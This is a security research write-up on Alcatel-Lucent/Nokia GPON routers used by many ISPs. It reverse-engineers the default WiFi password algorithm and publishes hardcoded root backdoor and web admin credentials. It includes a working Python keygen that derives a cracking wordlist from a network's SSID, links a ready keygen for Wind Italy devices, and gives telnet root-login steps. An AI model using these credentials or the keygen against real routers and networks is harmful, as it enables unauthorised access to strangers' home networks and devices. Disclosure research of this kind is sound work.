# ALU/Nokia GPON Admin and WIFI keygen
## Authors

 * Giulio - [https://lsd.cat](https://lsd.cat) - [https://twitter.com/0x1911](https://twitter.com/0x1911)
 * nico - [https://pwn.army](https://pwn.army) - [https://twitter.com/ndaprela](https://twitter.com/ndaprela)

## Intro
In recent years in Italy the development of Fiber To The Home technology has finally started, with the public participated company OpenFiber doing most of the infrastructure work. The network is then resold trough the many partner providers.

It has been the case also for other countries in the world and almost everywhere the standard for residential optical connection is GPON. [This research by Pierre Kim is extremely useful to better understand the standard and the network topology](https://pierrekim.github.io/blog/2016-11-01-gpon-ftth-networks-insecurity.html) and also provides a nice overview of its security.

This type of connection requires different equipment than ADSL/VDSL and thus specific GPON gateways are now available on the market, either as standalone devices (GPON to SFP, GPON to RJ45) or as fully featured CPEs.

Technicolor, along with Alcatel-Lucent, Nokia and Huawei are the leading manufactures of these devices and the suppliers for ISPs. Unsurprisingly, many different devices from even different companies have the same components and sometimes even share some software stack: below is a noncomprehensive table of confirmed and suspected devices having the same common problems described later. Apparently there's also a reseller called Zhone that customizes the same CPE for some ISPs. Eltex might be another one.


| CODE | Country | ISP | Manufacturer | Model | SSID Format  |
|---|---|---|---|---|---|
| MXXT | Mexico | Telmex | Nokia | [G-240W-B](https://www.nokia.com/networks/products/7368-isam-ont-g-240w-b/) | `INFINITUM%4s_2.4` |
| PTXX | Indonesia | Speedy | Unknown | Unknown | `speedy@%02x%02x` |
| ALCL | Generic | Unknown | Unknown | Unknown | `ALHN-%s` |
| SRBJ | Serbia | Unknown | Unknown | Unknown | `ALHN-%s` |
| ORGS | Generic | Unknown | Unknown | Unknown | `ALHN-%s` |
| VFSP | Spain | Vodafone | Unknown | Unknown | `vodafone%4m` |
| HGXX | Generic | Unknown | Unknown | Unknown | `ALHN-%s` |
| ENTB | Colombia | ETB | Alcatel-Lucent | [I-240W-A](https://fccid.io/2ADZRI240WA/User-Manual/User-Manual-2679109) | `FibraETB%s` |
| AXTE | Mexico | Axtel | Unknown | Unknown | `XTEL-XTREMO-%s` |
| IUSA | Mexico | Iusacell | Unknown | Unknown | `ALU-I240WA-%s` |
| STXX | Saudi Arabia | STC | Nokia | [G-240W-B](https://www.nokia.com/networks/products/7368-isam-ont-g-240w-b/) | `STC_WiFi_%4s` |
| DUXX | United Arab Emirates | Du Telecom | Unknown | Unknown | `ALHN-%s` |
| ITPC | Iraq | Unknown | Unknown | Unknown | `ALHN-%s` |
| KAZA | Kazakhstan | Kazakhtelecom  | Unknown | Unknown | `ALHN-%s` |
| TKRG | Turkey | Turk Telecom  | Unknown | Unknown | `ALHN-%s` |
| ITAX | Italy | Wind | Nokia/Alcatel-Lucent  | [G-240W-B](https://www.nokia.com/networks/products/7368-isam-ont-g-240w-b/)/[I-240W-Q](https://www.infostrada.it/fileadmin/Materiale/guidemodem/Manuale_modem_fibra_ALU_I-240W-Q_rev_1.2_-_Italiano.pdf) | `ALHN-%s` |
| VIET | Vietnam | Viettel | Alcatel-Lucent | [G241W-A](https://fccid.io/2ADZRG241W-A/User-Manual/Users-Manual-2688980) | `VIETTEL-%4s` |
| ETIS | United Arab Emirates | Etisalat | Nokia | [G-240G-C](https://static1.squarespace.com/static/519f78cae4b0cc7b837ad9d2/t/5b339694f950b7fadb98098c/1530107541390/Nokia_7368_ISAM_ONT_G-240G-C_for_Optical_LAN_Data_Sheet_EN.pdf) | `ONT%fs2.4G` |
| ATEB | Saudi Arabia | GO Telecom | Unknown | Unknown | `GO_WiFi_%4s` |
| TRUE | Thailand | True Internet | Unknown | Unknown | `true_home2G_%01x%02x` |
| SIGH | Singapore | Singtel | Alcatel-Lucent | Unknown | `SINGTEL-%4s` |
| VFTK | Turkey | Vodafone Turkey | Unknown | Unknown | `VodafoneNet` |
| MXXV | Mexico | Telmex | Unknown | Unknown | `ALHN-%s` |
| SAIB | Mexico | Telmex | Unknown | Unknown | `ALHN-%s` |
| LATT | Latvia | Lattelekom | Unknown | Unknown | `ALHN-%s` |
| JPNX | Japan | Unknown | Unknown | Unknown | `ALHN-%s` |
| LAOS | Laos | Sky Telecom | Unknown | Unknown | `SKYTEL-%4s` |
| VIVA | Bulgaria | Vivacom | Unknown | Unknown | `VIVACOM_FiberNet` |
| PXSF | Belgium | Belgacom | Unknown | Unknown | Unspecified |
| OCIT | Ivory Coast | Orange Ivory Coast | Unknown | Unknown | `ORANGEFIBER-%4s` |

## FCC Infos
Different enclosures or slight variants of the same board can be identified by looking at the [documents published by Nokia for the FCC](https://fccid.io/2ADZR).

 * https://fccid.io/2ADZRG240WG
 * https://fccid.io/2ADZRG240WE
 * https://fccid.io/2ADZRG241W-A
 * https://fccid.io/2ADZRG240WB
 * https://fccid.io/2ADZRG240WA
 * https://fccid.io/2ADZRI240WA
 * https://fccid.io/2ADZRG240WZA
 * https://fccid.io/2ADZRG240WE


## Pictures

![front Nokia G240W-B](https://git.lsd.cat/g/nokia-keygen/raw/master/images/front.jpg)

## Models

The models which share the same firmware, or at least part of it, according to some code we reversed, are:
```
B0404G - B-0404G-B - F-010G-A - F010GA - F-010G-B - F010GB - F-240W-A - F240WA - G-010F-A - G-010F-B - G-010G-A - G-040F-A - G-040F-B - G-040G-A - G040GA - G-110G-A - G110GA - G-211M-A - G-240G-A - G240GA - G-240G-B - G-240G-C - G240GC - G-240G-D - G240GD - G-240W-A - G-240W-B - G-240W-D - G-240WZ-A - G-241W-A - G-440G-A - G440GA - G-821G-B - G821GB - G-821M-A - G-881G-A - G881GA - G-881G-B - G881GB - GP-240G-A - GP240GA - HN-5224-XG - I-010G - I-010G-C - I-040E - I-120E - I-120E-Q - I-120E-QT - I-120G-B - I-240E - I-240E-Q - I240GB - I-240G-D - I240GD - I-240W - I-240W-A - I240WA - I-240W-B - I240WB - I-240W-Q - I-240W-QT - MCMB-A - RG200O-CA - RG201O-CA - RG221O-CA - SRNT-A - TW-080GX-A - TW-240GX-A
```

## Hardware
The board itself has 128MB flash and 256MB RAM. An additional SPI Flash of 16MB is soldered on the back of the board.

`/proc/mtd`
```
mtd0: 00080000 00020000 "cferom"
mtd1: 00080000 00020000 "nvram"
mtd2: 00c00000 00020000 "cfg"
mtd3: 00680000 00020000 "jff2_0"
mtd4: 00680000 00020000 "jff2_1"
mtd5: 02600000 00020000 "rootfs0"
mtd6: 02600000 00020000 "rootfs1"
mtd7: 01a00000 00020000 "log"
mtd8: 0237b000 0001f000 "0"
mtd9: 0000000c 0001f000 "0"
mtd10: 00a0d000 0001f000 "1"
mtd11: 01702000 0001f000 "0"
mtd12: 0237b000 0001f000 "0"
```

It seems to be using the CFE bootloader, which is [described here](https://raw.githubusercontent.com/Noltari/cfe_bcm63xx/master/bcm963xx_bootloader_appnote.pdf).

`/proc/cpuinfo`

```
system type             : 968380GERG
processor               : 0
cpu model               : Broadcom BMIPS4350 V8.0
BogoMIPS                : 598.01
wait instruction        : yes
microsecond timers      : yes
tlb_entries             : 32
extra interrupt vector  : no
hardware watchpoint     : no
ASEs implemented        :
shadow register sets    : 1
kscratch registers      : 0
core                    : 0
VCED exceptions         : not available
VCEI exceptions         : not available

processor               : 1
cpu model               : Broadcom BMIPS4350 V8.0
BogoMIPS                : 606.20
wait instruction        : yes
microsecond timers      : yes
tlb_entries             : 32
extra interrupt vector  : no
hardware watchpoint     : no
ASEs implemented        :
shadow register sets    : 1
kscratch registers      : 0
core                    : 0
VCED exceptions         : not available
VCEI exceptions         : not available
```

The main SoC and the GPON module are made by Broadcom.

Both 2.4Ghz and 5Ghz wifi are supported and seems to be made by Quantenna. They seem to be powered by the Topaz chipset, [which has recently been added to the Linux Kernel](https://patchwork.kernel.org/patch/10630331/) for which there's a lack of binaries in `linux-firmware` but there's an [interesting discussion here](https://patchwork.kernel.org/patch/10643357/). Additional code might be present in the [Google Fiber repository](https://gfiber.googlesource.com/kernel/skids/+/master/drivers/topaz).

## A Complete Mess
There are already known backdoors like described here [https://www.websec.ca/publication/Blog/backdoors-in-Zhone-GPON-2520-and-Alcatel-Lucent-I240Q](https://www.websec.ca/publication/Blog/backdoors-in-Zhone-GPON-2520-and-Alcatel-Lucent-I240Q). While my device does not have the SSH service exposed it does have telnet on port `23`. A root shell can be easily obtained by simply logging in via `ONTUSER:SUGAR2A041`.

Once logged in it easy to find that the manufacturer actually committed all specific customizations to every device. There are indeed plenty of files not useful for this specific model, a dozen different web interfaces and configuration files for any ISP on the table above. There's also a lot of debugging mess, like this one:

`/bcm/script/add_asb_user.sh`

```
#!/bin/sh

#add debug ONTUSER and config ONTUSER env, add by xufuguo, 20120808
#Note: don't chang PS1, bob calibration software need terminal prefix just "#"
#update for R30 read-only rootfs, modify by xufuguo, 20130816

exist=no
preconfig=no
home_dir=/configs/home

while read LINE
do
        temp=$(echo $LINE | awk -F : '{print $1}')
        if [ "${temp}" != "ONTUSER" ]; then
                continue
        fi
        exist=yes
        break
done < /etc/passwd

# BRCM use confignew.cfg
if [ ! -f /configs/config.cfg -a  ! -f /configs/confignew.cfg ]; then
        preconfig=yes
fi

if [ "${exist}" = "no" -o "${preconfig}" = "yes" ]; then
        rm -f /configs/etc/*+ #clean up temp files
        [ -d ${home_dir} ] || mkdir -p ${home_dir}
        sed -i -e '/ONTUSER/'d /configs/etc/passwd #del username,passwd,config file
        sed -i -e '/ONTUSER/'d /configs/etc/shadow
        rm -rf ${home_dir}/ONTUSER
        op_id=$(ritool get OperatorID | awk -F : '{print $2}')
        if [ "${op_id}" = "0000" -o ! -f /usr/sbin/vtysh ];then #factory mode
                adduser -D -h ${home_dir}/ONTUSER -G wheel ONTUSER
        else
                adduser -D -h ${home_dir}/ONTUSER -G wheel ONTUSER -s /usr/sbin/vtysh
        fi
        echo "ONTUSER:SUGAR2A041" | chpasswd -m > /dev/null 2>&1
        echo "export PS1=\"[\\u@\\h: \\W]\\\\\$ \"" >> ${home_dir}/ONTUSER/.bashrc

        #chang uid to 0 for get root authorization
        source /bcm/script/rootmod.sh ONTUSER

        sync
fi
```

That's how bad it is and [Wind experienced it first hand when in 2017](https://www.macitynet.it/la-rete-fibra-wind-bloccata-un-malware-mette-uso-modem/) a wrong update exposed the telnet port on the internet allowing the infamous BrickerBot to turn almost 20000 CPEs in total electronic garbage (well, more than they were before). Yep, they had to freely ship a new modem to everybody and people suffered multiple days of total downtime.

## Configuration tools
There are two useful configuration tools called `cfgcli` and `ritool`.

### Cfgcli
`cfgcli` is used to configure all the properties od the user in an XML like structure. It can be used to retrieve VOIP, PPP, TR69, SLID and many more information.

A simple `cfgcli dump` will return all properties.


```
cfgcli  -a  list all  DataModule Element.
        -e [TagName]  list Elemnts within special tag.
        -d [0|1|2|3|4|0xFF]  set debug level. 0 off 1 error 2 debug
           3 allOnBoot 4 allOffBoot 0xFF all.
        -o [0|1|2|3]  stdin|stderr|syslog|telnet
        -s [path value] set parameter value by path.
        -g [path]  get parameter value by path.
        -f force to write, only used with -s.
        -r [flag] reset to default.
           flag is optional, can be "all" to remove remote pre-config togather.
        -k reset to default with key parameter info.
        -t feed watchdog.
        <command> [option] <cmd_args...>; command to run.
        help; print help of cfgcli command.
        -h help.
cfgcli <command> [option] [cmd_args...]; command to run.
    help
        print this help. you can use: cfgcli -h get other help.
    load_remote_pre [-r] <path>
        load remote pre-configuration. option -r to specify if reboot.
    load_remote_cfg <path>
        load remote configuration update.
    remove_remote_pre
        remove remote pre-configuration.
    remove_remote_cfg
        remove remote configuration update.
    add <URI>
        add dynamic node by URI.
    del <URI>
        del dynamic node by URI.
    set <URI> <value>
        set node's value by URI.
    set <URI> <attribute> <value>
        set node's attribute value by URI.
    get <URI>
        get node's value by URI.
    get <URI> <attribute>
        get node's attribute value by URI.
    dump <URI|NodeName>
        dump node XML string by URI or by node name matched.
    debug precfg_debug_mode
        Display current precfg debug status.
    debug precfg_debug_mode <enable|disable>
        Set precfg debug status.
 <====================== private data model manage commands ===================>
    dumpwan    - to dump the existing wan interfaces
    createwan <type> <vlan> <pbit> - to create a wan interface, default to INTERNET only
        type   - 1 dhcp
        type   - 2 pppoe
    deletewan <id> - delete specific wan
    showport   - show all port type and voice config type to determinate the wan interface upper limit
    showlayer3 - show all the layer3 forwarding entries
```

### Ritool
Apparently all devices and boards have the same flash content except for some specific data, like the serial number, the operator id and so on.
These OEM binaries manage this data through a lib called `/lib/libri.so` which interacts with a device `/dev/ri_drv`. This device is controlled by a proprietary Broadcom kernel module called `/bcm/bin/ri.ko`. What this module does is basically reading and writing values to an i2c eeprom.

The usage is really basic
```
Usage:
    ritool [OPTIONS] ....

OPTIONS
    -h, help
            Output a small usage guide
    init
            initialize all ri value
    get
            get specified ri value
    set
            set specified ri value
    dump
            dump all ri value
```

The dump command returns all stored variables:

```
the Format:01
the MfrID:ALCL
the Factorycode:02
the HardwareVersion:3FE56756AABB
the ICS:01
the YPSerialNum:        B133F2B0
the CleiCode:0000000000
the Mnemonic:G-240W-B
the ProgDate:170720
the MACAddress:f8:44:e3:d6:63:f0
the DeviceIDPref:3030
the SWImage:3030
the OnuMode:0003
the Mnemonic2:
the Password:30303030303030303030
the G984Serial:b133f2b0
the HWConfiguration:3030303030303030
the PartNumber:3FE56756BAAA
the Variant:AA
the Spare4:303030303030303030303030
the Checksum:c9e2
the InserviceReg:3030
the UserName:       userAdmin
the UserPassword:00000000
the MgntUserName:      adminadmin
the MgntUserPassword: ALC#FGU
the SSID-1Name:0000000000000000
the SSID-1Password:00000000
the SSID-2Name:0000000000000000
the SSID-2Password:00000000
the OperatorID:ITAX
the SLID:30303030303030303030303030303030
the CountryID:eu
the Spare5:303030303030
the Checksum1:01e4
the Spare6:3030
the RollbackFlag:ffff
ProductClass[G-240W-B] Platform[29] Uplink[GPON] Type[HGU] EthPorts[4] EnetPortType[GE] POTS[2] USB[2] WIFI[2] SIM[0] IsBosa[4] SlicType[LE9540] WifiType[BCM4331QTN11AC] JDM[T&W] SOC[BRCM_68380]

```

The most important ones are `G984Serial` which is the serial value actually used in all the system and `OperatorID` which defines the branding of the modem. `PartNumber` defines the actual board model.

So, for instance, with
```
ritool set OperatorID AXTEL
```
Is possible to brand the modem for Mexico's Axtel. To force the modem to reconfigure after a change a factory reset is necessary. To do so press the shortest button on the back for at least 10 seconds while it is powered on.



## Password Generation

![labels](https://git.lsd.cat/g/nokia-keygen/raw/master/images/labels.jpg)

While it is impossible to know in advance, most of the time this kind of device generates a unique password following a hardcoded algorithm. It is extremely rare for the manufacturer to manually insert secrets in every device and the automatic generation solution may be secure given that the algorithm is seeded by data unknown to a potential attacker.

Bad examples include passwords generated based on MAC Address while password based on serials are often better, given that an attacker has no way to know it and it is not derived from other known data. In this case however the serial is partially predictable and partially known to an attacker thanks to its inclusion in SSID so a secure implementation should use something else.

Note also that a WPA Key always comprised only of ten digits can be cracked using [Hashcat](https://hashcat.net/hashcat/) with a GTX 1070 in less than 10 hours.

## Where to Look
[There's an interesting file in `/etc/preconfiguration_global.xml`](https://git.lsd.cat/g/nokia-keygen/raw/master/xml/preconfiguration_global.xml). It contains the automatic configuration instructions for every ISP supported.


```
<WLAN_1. n="WLAN_1" a="static">
        <Enable t="string" ml="12" v="true" dburi="InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.Enable"/>
        <MACAddressControlEnabled t="string" ml="12" v="false" dburi="InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.MACAddressControlEnabled"/>
        <Standard t="string" ml="12" v="b,g,n" dburi="InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.Standard"/>
        <ssidName t="string" ml="64" v="" fri="alhn_genssid1" dburi="InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.SSID"/>
        <Powerlevel t="string" ml="4" v="100" dburi="InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.TransmitPower"/>
        <BeaconType t="string" ml="4" v="WPAand11i" dburi="InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.BeaconType"/>
        <WPSEnable t="string" ml="12" v="1" dburi="InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.WPSEnable"/>
        <PreSharedKey t="string" ml="64" v="" fri="genpwd_longpasswd" dburi="InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.PreSharedKey.1.PreSharedKey"/>
</WLAN_1.>
```

By looking at other files and binaries, upon parsing this XML do the following:

 * For every ISP there's a root element with its code: `ITAX` is Wind Italy
 * Every nested element is a configuration section. Useful information includes TR-69 URLs and credentials, PPP credentials and WIFI SSID and Key
 * A single line can contain a static value or a string that map to a specific function in a configuration binary:
   - `fri` value is the function
   - `v` value is an optional argument

[The responsible binary](https://git.lsd.cat/g/nokia-keygen/raw/master/bin/cfgmgr) is `/sbin/cgfmgr` which starts at boot and stays alive during all the normal device operation.

## Reversing
By reversing this binary and using `ritool` to perform dynamic tests it's pretty easy to understand how things work.

Essentially the various fields inside the XML file may be hardcoded or generated using some runtime code and configurations.

Often there is something which looks like a format string and then another attribute which specifies how to use that string.

This is an example snippet of such a scheme

```xml
<ssidName t="string" ml="64" v="ALHN-%4s-11ac-4" fri="genssidfmt" dburi="SSID"/>
```

This mechanism is not used only for WLAN passwords and the concepts can be applied more broadly.

By inspecting the XML we can identify just a bunch of "format strings" and few values for the attribute "fri".

Another example is the following
```xml
<ssidName t="string" ml="64" v="" fri="alhn_genssid1" dburi="InternetGatewayDevice.LANDevice.1.WLANConfiguration.1.SSID"/>
```

In this case, if we search for the corresponding C code inside `cfgmgr` we can find how the "format string" is actually shaped

```c
snprintf(ssidName,0x40,"ALHN-%s",__n + 0x74c4ee);
```

We leave to the reader the pleasure to reverse the XML and the binary for a complete and detailed understanding of what is going on (BONUS: lots of cleartext hardcoded credentials can be found during this process...)

For what we are concerned there are just a few ideas that we need to make clear.

First of all, these are not exactly format strings. By inspecting the code/doing test with `ritool` is pretty immediate to understand that the meaning of the most used"format strings" is the following:

- %4s: lower 2 bytes of the serial code, represented in hex
- %4m: lower 2 bytes of the MAC address, represented in hex
- %8m: lower 4 bytes of the MAC address, represented in hex

The point of our research is to find cases where WLAN passwords can be efficiently cracked by knowing public informations such as the SSID and the MAC address.

An immediate case that doesn't even require further reversing is when the WLAN inside the XML uses the lower bytes of the MAC address as a password.

```xml
<PreSharedKey t="string" ml="64" v="%8m" fri="genssidfmt" dburi="PreSharedKey.1.PreSharedKey"/>
```

This happens for 3 WLANs described inside the XML.

The other case that we will publicly present is when the SSID contains a piece of the serial code and the password is generated using `gen_mgntlongpw_and_wanpw` function.

Essentially we are now talking about all the WLANs which use a format string containing `%4s` combined with `genssidfmt` for the SSID generation and `gen_mgntlongpw_and_wanpw` for the password generation.

This also works for the WLANs which have `fri=alhn_genssid1` and use `gen_mgntlongpw_and_wanpw` for the password generation.

The following is the decompiled code we can get from Ghidra with some manual analysis hints and variable renaming.

```
/* WARNING: Could not reconcile some variable overlaps */

undefined4
gen_mgntlongpw_and_wanpw
          (undefined4 oui,char *serialnum_string,char *longpasswd_dst,char *wanpasswd_dst)

{
  undefined8 longpasswd;
  int i;
  uint n2;
  uint n1;
  char secret1 [32];
  char secret2 [32];
  undefined4 serialnum_int;
  char md5_secret1 [16];
  char md5_secret2 [16];
  char strToBase32Encode [19];
  undefined wanpasswd [32];
  
  if (enter != 1) {
    log_log(2,"gen_mgntlongpw_and_wanpw",0x112,"enter\n");
    sscanf(serialnum_string,"%x",&serialnum_int);
    sprintf(secret1,"%s-ALCL%s",oui,serialnum_string);
    sprintf(secret2,"%s-01%u",oui,serialnum_int);
    md5(secret1,md5_secret1);
    md5(secret2,md5_secret2);
    strToBase32Encode._0_4_ = md5_secret1._0_4_;
    strToBase32Encode._4_4_ = md5_secret1._4_4_;
    strToBase32Encode._8_4_ = md5_secret1._8_4_;
    strToBase32Encode._12_4_ = md5_secret1._12_4_;
    strToBase32Encode[16] = md5_secret2[0];
    strToBase32Encode[17] = md5_secret2[1];
    strToBase32Encode[18] = md5_secret2[2];
    base32_probably(strToBase32Encode,0x13,wanpasswd,0x20);
    snprintf(wanpasswd_dst,0x1f,"%s",wanpasswd);
    n1 = 0;
    n2 = 0;
    i = 0;
    while (i < 8) {
      n2 = n1 >> 0x18 | n2 << 8;
      n1 = n1 << 8 | (uint)(byte)md5_secret2[i + 8];
      i = i + 1;
    }
    longpasswd = __umoddi3(n2,n1,2,0x540be400);
    snprintf(longpasswd_dst,0xb,"%010llu");
    log_log(2,"gen_mgntlongpw_and_wanpw",0x134,"succeed!\n",longpasswd);
    enter = 1;
  }
  return 0;
}
```

The actual inputs are only the OUI (available in the XML and also easily bruteforceable) and a serial number, since the other two parameters are just destinations to store the generated passwords.

The code is pretty straightforward, at first it generates two strings and computes their MD5 hashes.

Then it concatenates the first hash and the first 3 bytes of the second, and encodes all of this as base32. The result is truncated and represents the first password.

For the second password instead it generates two numbers using the bytes of the second MD5, which will be used as lower and upper bits of a 64 bit integer. The password is simply this number modulus `0x20x540be400`.

## PoC Keygen

With this information we can write a PoC script that can produce a wordlist to efficiently crack a vulnerable SSID.

```py
#!/usr/bin/env python3

import argparse, base64,  hashlib, re

def genpwd_longpasswd(oui, serialnum):
    def str2md5(string):
        m = hashlib.md5()
        m.update(string.encode("ascii"))
        return m.digest()

    #secret1 = "%s-ALCL%s" % (oui, serialnum)
    secret2 = "%s-01%u" % (oui, int(serialnum, 16))

    #md5_secret1 = str2md5(secret1)
    md5_secret2 = str2md5(secret2)

    #wanpasswd = base64.b32encode(bytes(bytearray(md5_secret1[:16] + md5_secret2[:3]))).decode("ascii")[:30]

    lower = upper = i = 0

    for i in range(8):
        upper = (lower >> 0x18 | ((upper << 8)&0xffffffff))&0xffffffff
        lower = (((lower << 8)&0xffffffff) | md5_secret2[i + 8])&0xffffffff

    longpasswd = ((upper<<32)+lower)%0x2540be400

    return longpasswd

parser = argparse.ArgumentParser(prog="poc", description="A poc script to efficiently crack vulnerable routers")
parser.add_argument("ssid", type=str, help="the ssid to attack")
args = parser.parse_args()

oui   =     "D0542D"

ssids = [   "VIETTEL-[A-F0-9]{4}",
            "SKYTEL-[A-F0-9]{4}",
            "SINGTEL-[A-F0-9]{4}-5G-1",
            "SINGTEL-[A-F0-9]{4}",
            "ORANGEFIBER-[A-F0-9]{4}",
            "INFINITUM[A-F0-9]{4}_5-4",
            "INFINITUM[A-F0-9]{4}_5-3",
            "INFINITUM[A-F0-9]{4}_5-2",
            "INFINITUM[A-F0-9]{4}_5",
            "INFINITUM[A-F0-9]{4}_2.4-4",
            "INFINITUM[A-F0-9]{4}_2.4-3",
            "INFINITUM[A-F0-9]{4}_2.4-2",
            "INFINITUM[A-F0-9]{4}_2.4",
            "GO_WiFi_[A-F0-9]{4}",
            "ALHN-[A-F0-9]{4}-4",
            "ALHN-[A-F0-9]{4}-3",
            "ALHN-[A-F0-9]{4}-11ac-4",
            "ALHN-[A-F0-9]{4}-11ac-3",
            "ALHN-[A-F0-9]{4}-11ac-2",
            "ALHN-[A-F0-9]{4}-11ac",
            "ALHN-[A-F0-9]{4}"]

wordlist = set()

for s in ssids:
    if re.match(s, args.ssid) != None:
        serialBytes = args.ssid
        for r in s.split("[A-F0-9]{4}"):
            serialBytes = serialBytes.replace(r, "")
        for i in range(0xffff):
            print(genpwd_longpasswd(oui, "{:04x}{}".format(i, serialBytes)))
        break
```

We can quickly check this script against a test network. `SSID=INFINITUMF2B0_2.4-3` and `PASSWORD=3345321247`.

```
./keygen.py INFINITUMF2B0_2.4-3 | grep 3345321247
3345321247
```

This is a very basic and partial PoC.
We considered it to be enough to prove the point without publishing too many sensible things, but extending this keygen to handle all the possible vulnerable SSIDs, and the WLANs which use hardcoded password is pretty trivial.

## Wind Keygen

By analyzing listings on eBay and other sites with high-resolution pictures it was possible to build a small statistical set for the serial of devices distributed in Italy by Wind. The first byte of the serial is almost always `B1` with a few exceptions of `F2`.

In most cases also the second byte has just a dozen possibilities. While we're not going to release the dataset, it was possible, using the previous assumptions, to build a keygen with just a few different outputs, sorted by probability.

The number of possible attempts should be low enough to just try manually connecting without the need of aircrack and offline cracking.

[Wind Keygen](https://lsd.cat/keygen/)

## Unlocking

Before everything dump your config:
 * `cfgcli dump`
 * `ritool dump`

If you don't you may break your internet connection by losing your SLID or break your VOIP number by losing the credentials.

For those looking to use a branded CPE with a different GPON ISP here are the steps:

 * If neither telnet nor SSH is available try to enable one of them via the web interface in the `Access Control` page. Admin credentials are all in [preconfiguration_global.xml](https://git.lsd.cat/g/nokia-keygen/raw/master/xml/preconfiguration_global.xml).
 * Login via telnet or SSH using `ONTUSER:SUGAR2A041`.
 * Run `ritool set OperatorID ALCL`.
 * Press the reset button for 10 seconds and wait for a reboot.
 * Connect either via cable or using the preconfigured password. SSID will be `ALHN-%4s`
 * Router ip will be `192.168.1.254`
 * `ONTUSER` backdoor will always be there. User and password for the web panel are `AdminGPON:ALC#FGU`. Also there's a lower privileged user called `userAdmin` with the same password as the wifi.

## Acknowledgements
Almost a decade ago a group of unknown Italian researchers broke the algorithms for two of the local main ISP, Telecom and Fastweb. At the time I was a kid and, while it looked like black magic to me, I still found their research inspiring.

 * [Pirelli Fastweb](https://wifiresearchers.wordpress.com/2010/03/25/pirelli-fastweb-free-access/)
 * [Alice AGPF](https://wifiresearchers.wordpress.com/2010/06/02/alice-agpf-lalgoritmo/)
 * [Telsey Fastweb](https://wifiresearchers.wordpress.com/2010/09/09/telsey-fastweb-full-disclosure/)


There's also some interesting [work on the topic](https://haxx.in/upc_keys.c) by [blasty](https://twitter.com/@bl4sty).

## Contributions

Contributions of other models, ISP branding and sample data of SSIDs, serials and keys are welcome. Feel free to open an issue or contact us via email.